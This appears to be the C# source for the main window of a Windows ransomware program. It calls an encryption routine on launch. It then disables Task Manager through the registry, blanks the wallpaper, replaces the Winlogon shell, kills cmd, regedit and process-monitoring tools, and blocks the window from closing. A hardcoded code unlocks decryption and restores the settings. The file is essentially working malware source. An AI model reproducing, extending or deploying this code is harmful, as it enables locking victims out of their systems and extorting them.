using System;
using System.ComponentModel;
using System.Windows;
using System.Windows.Media;
using System.Windows.Input;
using System.Threading;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Net;
using Microsoft.Win32;

namespace TR
{
    public partial class MainWindow : Window
    {
        BackgroundWorker _Contador = new BackgroundWorker(); 
        BackgroundWorker _Desencryptar = new BackgroundWorker();

        Ransomware loader = new Ransomware();
        RegistryKey reg2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
        ClaseTexto cls = new ClaseTexto { Texto = "" };

        public MainWindow()
        {
            InitializeComponent();
            _Contador.DoWork += CuentaAtras;
            _Contador.RunWorkerAsync();

            _Desencryptar.DoWork += loader.Desencriptar;


            this.DataContext = cls;

            if (!File.Exists("C:\\Program Files\\System32\\CyptedReady.ini"))
            {
                Directory.CreateDirectory("C:\\Program Files\\System32");
                string[] Check = { reg2.GetValue("Wallpaper").ToString() };
                File.WriteAllLines("C:\\Program Files\\System32\\CyptedReady.ini", Check);

                loader.Encriptar();
            }
            DesabilitarCosas();
        }
        public Object WallPaper;
        private void DesabilitarCosas()
        {
            RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            reg.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);

            RegistryKey reg2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
            reg2.SetValue("Wallpaper", "", RegistryValueKind.String);
                
            RegistryKey reg3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            reg3.SetValue("Shell", "empty", RegistryValueKind.String);

            Process[] processRunning = Process.GetProcesses();
            foreach (Process pr in processRunning)
            {
                if (pr.ProcessName == "cmd" || pr.ProcessName == "regedit" || pr.ProcessName == "Processhacker" || pr.ProcessName == "Taskmgr")
                {
                    pr.Kill();
                }
            }
        }
        private void HabilitarCosas()
        {
            RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            reg.SetValue("DisableTaskMgr", "", RegistryValueKind.String);

            RegistryKey reg2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
            WallPaper = File.ReadAllText("C:\\Program Files\\System32\\CyptedReady.ini");
            reg2.SetValue("Wallpaper", WallPaper, RegistryValueKind.String);

            RegistryKey reg3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            reg3.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
        }
        private void MoverPantalla(object sender, MouseEventArgs e)
        {
            if (e.LeftButton.ToString() == "Pressed")
            {
                DragMove();
            }
        }
        private void ClickBoton(object sender, RoutedEventArgs e)
        {
            if (cls.Texto == "8410412190077")
            {
                Ventana.Visibility = Visibility.Hidden;
                HabilitarCosas();
                File.Delete("C:\\Program Files\\System32\\CyptedReady.ini");
                _Desencryptar.RunWorkerAsync();
            }
            else
            {
                Boton.Foreground = Brushes.Red;
            }
        }

        private void Ventana_Closing(object sender, CancelEventArgs e)
        {
            e.Cancel = true;
        }
    }
    public class ClaseTexto : INotifyPropertyChanged
    {
        public string texto;
        public string Texto
        {
            get { return texto; }
            set { texto = value;
                OnPropertyChanged();
            }
        }
        protected void OnPropertyChanged(string property = "")
        {
            if( PropertyChanged != null)
            {
                PropertyChanged(this, new PropertyChangedEventArgs(property));  
            }
        }
        public event PropertyChangedEventHandler PropertyChanged;
    }
}
